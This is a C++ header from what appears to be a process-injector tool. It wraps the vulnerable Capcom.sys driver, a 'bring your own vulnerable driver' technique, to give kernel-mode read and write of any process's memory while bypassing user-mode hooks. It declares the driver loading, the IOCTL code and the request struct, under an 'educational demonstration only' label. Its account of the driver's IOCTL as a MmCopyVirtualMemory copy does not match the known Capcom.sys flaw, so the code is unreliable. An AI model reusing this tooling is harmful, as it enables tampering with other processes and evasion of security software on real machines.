// src/Injector/CapcomDriver.h
#pragma once
#include <windows.h>
#include <cstdint>
#include <string>

// Capcom.sys vulnerable IOCTL — calls MmCopyVirtualMemory with user-supplied args
constexpr DWORD CAPCOM_IOCTL_READWRITE = 0xAA013044;
constexpr const wchar_t* CAPCOM_SERVICE_NAME = L"Capcom";
constexpr const wchar_t* CAPCOM_DRIVER_PATH = L"Capcom.sys"; // relative to exe directory

#pragma pack(push, 1)
struct CapcomRequest {
    uint32_t srcPid;    // source process ID
    uint32_t dstPid;    // destination process ID
    uint64_t srcAddr;   // source virtual address
    uint64_t dstAddr;   // destination virtual address
    uint64_t size;      // number of bytes to copy
    uint32_t flags;     // 0 for normal R/W
};
#pragma pack(pop)

/**
 * CapcomDriver — manages the Capcom.sys vulnerable driver lifecycle
 * and exposes kernel-mode R/W backed by MmCopyVirtualMemory.
 *
 * Singleton. All memory operations bypass user-mode hooks since the
 * IOCTL handler runs in ring 0.
 *
 * FOR EDUCATIONAL DEMONSTRATION ONLY — BYOVD technique.
 */
class CapcomDriver {
public:
    static CapcomDriver& GetInstance();

    // ---- Driver Lifecycle ----
    // Load via Service Control Manager (requires SeLoadDriverPrivilege).
    bool LoadDriver();
    void UnloadDriver();
    bool IsLoaded() const { return m_hDevice != INVALID_HANDLE_VALUE; }
    HANDLE GetDeviceHandle() const { return m_hDevice; }

    // ---- Kernel R/W Primitives ----
    // Read `size` bytes from target process `pid` at `addr` into `outBuf`.
    bool ReadMemory(DWORD pid, uintptr_t addr, void* outBuf, size_t size);
    // Write `size` bytes from `inBuf` into target process `pid` at `addr`.
    bool WriteMemory(DWORD pid, uintptr_t addr, const void* inBuf, size_t size);
    // Templated convenience read.
    template<typename T>
    T Read(DWORD pid, uintptr_t addr) {
        T value{};
        ReadMemory(pid, addr, &value, sizeof(T));
        return value;
    }
    // Templated convenience write.
    template<typename T>
    void Write(DWORD pid, uintptr_t addr, T value) {
        WriteMemory(pid, addr, &value, sizeof(T));
    }

    DWORD GetOwnPid() const { return m_ownPid; }

private:
    CapcomDriver() = default;
    ~CapcomDriver();
    CapcomDriver(const CapcomDriver&) = delete;
    CapcomDriver& operator=(const CapcomDriver&) = delete;

    HANDLE m_hDevice = INVALID_HANDLE_VALUE;
    DWORD  m_ownPid  = 0;
};
